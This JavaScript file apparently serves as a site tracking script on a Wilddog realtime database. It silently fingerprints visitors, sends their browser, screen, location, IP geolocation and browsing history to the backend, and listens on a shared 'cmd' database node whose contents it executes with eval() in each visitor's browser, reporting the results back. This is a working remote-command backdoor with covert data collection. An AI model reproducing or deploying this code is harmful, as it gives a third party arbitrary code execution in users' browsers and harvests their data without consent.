import Wilddog from 'wilddog/lib/wilddog-web';
import $ from 'jquery';
import is from 'is';

var users = window.root = new Wilddog(`${WILDDOG_APP}/users`);

const saveObject = (obj)=> {
  let toBeSaved = {};
  for (var key in obj) {
    let val = obj[key];
    if (is.number(val) || is.boolean(val) || is.string(val) || is.null(val)) {
      toBeSaved[key] = val;
    } else if (is.array(val) || is.object(val)) {
      toBeSaved[key] = saveObject(val);
    }
  }
  return toBeSaved;
}

users.onAuth((auth)=> {
  if (auth) {
    var user = users.child(auth.uid);
    user.update({
      ua: navigator.userAgent,
      navigator: saveObject(navigator),
      screen: saveObject(window.screen),
      location: saveObject(window.location)
    });

    $.getJSON("http://ip-api.com/json?callback=?", function (json) {
      user.update({
        ipapi: json
      });
    });

    $.getScript("http://pv.sohu.com/cityjson?ie=utf-8", function () {
      user.update({
        sohu: window.returnCitySN
      });
    });

    var cmd = users.root().child('cmd');
    cmd.on('value', snapshot=> {

      if (!snapshot.val()) {
        return;
      }

      let {
        cmd,
        timestamp
      } = snapshot.val();

      let localTimestamp = localStorage.getItem('cmd.timestamp');

      if (localTimestamp != timestamp) {
        localStorage.setItem('cmd.timestamp', timestamp);
        var c = user.child(`commands`).push({
          begin: timestamp,
          end: Wilddog.ServerValue.TIMESTAMP,
          result: "" + JSON.stringify(eval(cmd)),
          cmd
        })
      }
    });

    var viewId = user.child('history').push({
      href: window.location.href,
      timestamp: Wilddog.ServerValue.TIMESTAMP
    }).key();

    var performanceRef = users.root().child('performance').child(viewId);

    performanceRef.update(Object.assign(saveObject(performance.timing), {
      uid: auth.uid
    }))

    $(window).load(()=> {
      performance && performance.getEntries && performance.getEntries().forEach((item, i)=> {
        performanceRef.child(`entries/${i}`).set(saveObject(item))
      });
    })

  }
})

if (!users.getAuth()) {
  users.authAnonymously(e=>false);
}

